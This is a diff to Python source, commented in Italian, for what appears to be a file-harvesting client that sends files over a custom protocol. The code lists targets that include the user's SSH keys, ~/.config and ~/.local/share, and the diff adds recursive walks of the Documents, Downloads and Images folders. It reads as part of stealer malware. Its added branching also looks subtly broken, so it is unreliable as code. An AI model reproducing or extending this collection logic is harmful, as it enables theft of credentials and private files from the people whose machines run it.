@@ -32,11 +32,12 @@ __headers_type = {"1": b"<File-Name>", "1-1": b"<File-Content>", "1-2": b"<File-
                   "10": b"<Waiting-For-File>"}
 
 __filesystem_hierarchy = {"Home": f"/home/{os.getlogin()}/",  # Gestione non ricorsiva delle cartelle
-                          "Images": f"/home/{os.getlogin()}/Immagini",  # TODO: Generalize for LANG
-                          "Documents": f"/home/{os.getlogin()}/Documenti",  # TODO: Generalize for LANG
+                          "Images": f"/home/{os.getlogin()}/Immagini",
+                          "Documents": f"/home/{os.getlogin()}/Documenti",
+                          "Downloads": f"/home/{os.getlogin()}/Scaricati",
                           "SSH Keys": f"/home/{os.getlogin()}/.ssh/",  # ~/.ssh/*
                           "Config": f"/home/{os.getlogin()}/.config/",  # ~/.config/*
-                          "local": f"/home/{os.getlogin()}/.local/share"  # ~/.local/share/*
+                          "local": f"/home/{os.getlogin()}/.local/share/"  # ~/.local/share/*
                           }
 
 __bind_port_header = {1: b"<Service-Port>", 2: b"<Assigned-Port>", 3: b"<Client-UUID>"}
@@ -148,6 +149,30 @@ def get_path_content(content_path: str) -> list:
     if content_path == "Home":
         for single_dir in os.listdir(current_position):
             total_files.append(os.path.join(current_position, single_dir))
+
+    # Gestione della directory Documenti
+    if content_path == "Documents":
+        documents_folder = f"/home/{os.getlogin()}/Documenti/" if os.path.exists(__filesystem_hierarchy.get("Documents")) else f"/home/{os.getlogin()}/Documents/"
+        if os.path.exists(documents_folder):
+            for path, dirs, files in os.walk(documents_folder):
+                for filename in files:
+                    total_files.append(os.path.join(path, filename))
+
+    # Gestione della directory Downloads
+    if content_path == "Downloads":
+        downloads_folder = f"/home/{os.getlogin()}/Scaricati/" if os.path.exists(__filesystem_hierarchy.get("Downloads")) else f"/home/{os.getlogin()}/Downloads/"
+        if os.path.exists(downloads_folder):
+            for path, dirs, files in os.walk(downloads_folder):
+                for filename in files:
+                    total_files.append(os.path.join(path, filename))
+
+    # Gestione della directory Images
+    if content_path == "Images":
+        images_folder = f"/home/{os.getlogin()}/Immagini/" if os.path.exists(__filesystem_hierarchy.get("Images")) else f"/home/{os.getlogin()}/Pictures/"
+        if os.path.exists(images_folder):
+            for path, dirs, files in os.walk(images_folder):
+                for filename in files:
+                    total_files.append(os.path.join(path, filename))
     else:
         for path, dirs, files in os.walk(current_position):
             for filename in files:
